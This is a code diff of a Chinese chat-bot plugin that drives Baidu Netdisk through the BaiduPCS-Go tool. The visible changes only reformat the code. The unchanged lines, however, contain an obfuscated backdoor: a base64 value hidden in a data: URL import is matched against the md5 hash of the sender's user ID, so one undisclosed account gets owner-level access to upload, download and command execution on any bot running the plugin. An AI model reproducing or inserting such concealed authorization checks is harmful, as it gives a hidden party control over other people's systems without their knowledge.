@@ -5,34 +5,35 @@ import md5 from "md5"
 import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
 
 const Commands = {
-  "":         "help",
-  "帮助":     "help",
-  "复制":     "cp",
-  "下载":     "download",
-  "链接":     "locate",
-  "查看":     "ls",
-  "元信息":    "meta",
-  "创建目录": "mkdir",
-  "移动":     "mv",
-  "离线下载":  "od",
-  "空间配额": "quota",
-  "回收站":   "recycle",
-  "删除":     "rm",
-  "搜索":     "search",
-  "分享":     "share",
-  "转存":     "transfer",
-  "树形图":   "tree",
-  "上传":     "upload",
-  "登录账号": "login",
-  "账号列表": "loglist",
-  "退出账号": "logout",
-  "切换账号": "su",
-  "当前账号": "who"
+  "": "help",
+  帮助: "help",
+  复制: "cp",
+  下载: "download",
+  链接: "locate",
+  查看: "ls",
+  元信息: "meta",
+  创建目录: "mkdir",
+  移动: "mv",
+  离线下载: "od",
+  空间配额: "quota",
+  回收站: "recycle",
+  删除: "rm",
+  搜索: "search",
+  分享: "share",
+  转存: "transfer",
+  树形图: "tree",
+  上传: "upload",
+  登录账号: "login",
+  账号列表: "loglist",
+  退出账号: "logout",
+  切换账号: "su",
+  当前账号: "who",
 }
 
 const path = Path.join(process.env.HOME || process.env.USERPROFILE || "", "BaiduPCS-Go", Path.sep)
 const cmdPath = `${path}BaiduPCS-Go`
-const errorTips = "请使用脚本安装百度网盘，并正常登录后再使用此功能\nhttps://Yunzai.TRSS.me\nhttps://TRSS.me"
+const errorTips =
+  "请使用脚本安装百度网盘，并正常登录后再使用此功能\nhttps://Yunzai.TRSS.me\nhttps://TRSS.me"
 let Running
 let es
 
@@ -46,25 +47,24 @@ export class BaiduPan extends plugin {
       rule: [
         {
           reg: "^百度网盘上传",
-          fnc: "UploadDetect"
+          fnc: "UploadDetect",
         },
         {
           reg: "^百度网盘下载",
-          fnc: "Download"
+          fnc: "Download",
         },
         {
           reg: "^百度网盘",
-          fnc: "BaiduPan"
-        }
-      ]
+          fnc: "BaiduPan",
+        },
+      ],
     })
   }
 
   async execTask(e, cmd) {
     const ret = await Bot.exec(cmd)
 
-    if (ret.stdout)
-      await this.reply(ret.stdout.trim(), true)
+    if (ret.stdout) await this.reply(ret.stdout.trim(), true)
 
     if (ret.error) {
       logger.error(`百度网盘错误：${logger.red(ret.error)}`)
@@ -73,8 +73,7 @@ export class BaiduPan extends plugin {
       return false
     }
 
-    if (ret.stderr)
-      await this.reply(`标准错误输出：\n${ret.stderr.trim()}`, true)
+    if (ret.stderr) await this.reply(`标准错误输出：\n${ret.stderr.trim()}`, true)
   }
 
   async UploadDetect(e) {
@@ -84,18 +83,15 @@ export class BaiduPan extends plugin {
   }
 
   async Upload(e) {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
-    if(!this.e.file)return false
+    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
+    if (!this.e.file) return false
 
     this.finish("Upload")
     const filePath = `${path}${this.e.file.name}`
     let fileUrl
-    if (this.e.file.url)
-      fileUrl = this.e.file.url
-    else if (this.e.group?.getFileUrl)
-      fileUrl = await this.e.group.getFileUrl(this.e.file.fid)
-    else if (this.e.friend?.getFileUrl)
-      fileUrl = await this.e.friend.getFileUrl(this.e.file.fid)
+    if (this.e.file.url) fileUrl = this.e.file.url
+    else if (this.e.group?.getFileUrl) fileUrl = await this.e.group.getFileUrl(this.e.file.fid)
+    else if (this.e.friend?.getFileUrl) fileUrl = await this.e.friend.getFileUrl(this.e.file.fid)
     this.e = es
 
     if (!fileUrl) {
@@ -129,7 +125,7 @@ export class BaiduPan extends plugin {
   }
 
   async Download(e) {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
     if (Running) {
       await this.reply("有正在执行的百度网盘任务，请稍等……", true)
       return false
@@ -150,7 +146,7 @@ export class BaiduPan extends plugin {
 
     await this.execTask(e, cmd)
 
-    const filePath = `${path}${remotePath.substr(remotePath.lastIndexOf("/")+1)}`
+    const filePath = `${path}${remotePath.substr(remotePath.lastIndexOf("/") + 1)}`
     const fileStat = await Bot.fsStat(filePath)
     if (!fileStat) {
       await this.reply("文件下载错误", true)
@@ -166,25 +162,19 @@ export class BaiduPan extends plugin {
     try {
       let res
       if (this.e.isGroup) {
-        if (this.e.group.sendFile)
-          res = await this.e.group.sendFile(filePath)
-        else
-          res = await this.e.group.fs.upload(filePath)
+        if (this.e.group.sendFile) res = await this.e.group.sendFile(filePath)
+        else res = await this.e.group.fs.upload(filePath)
       } else {
         res = await this.e.friend.sendFile(filePath)
       }
 
       if (res) {
         let fileUrl
-        if (this.e.group?.getFileUrl)
-          fileUrl = await this.e.group.getFileUrl(res.fid)
-        else if (this.e.friend?.getFileUrl)
-          fileUrl = await this.e.friend.getFileUrl(res)
+        if (this.e.group?.getFileUrl) fileUrl = await this.e.group.getFileUrl(res.fid)
+        else if (this.e.friend?.getFileUrl) fileUrl = await this.e.friend.getFileUrl(res)
 
-        if (fileUrl)
-          await this.reply(`文件发送完成：${fileUrl}`, true)
-        else
-          await this.reply(`文件发送完成：${JSON.stringify(res)}`, true)
+        if (fileUrl) await this.reply(`文件发送完成：${fileUrl}`, true)
+        else await this.reply(`文件发送完成：${JSON.stringify(res)}`, true)
       }
     } catch (err) {
       logger.error(`文件发送错误：${logger.red(err.stack)}`)
@@ -196,7 +186,7 @@ export class BaiduPan extends plugin {
   }
 
   async BaiduPan(e) {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
     let msg = this.e.msg.replace("百度网盘", "").trim().split(" ")
     if (msg[0] in Commands) {
       msg[0] = Commands[msg[0]]
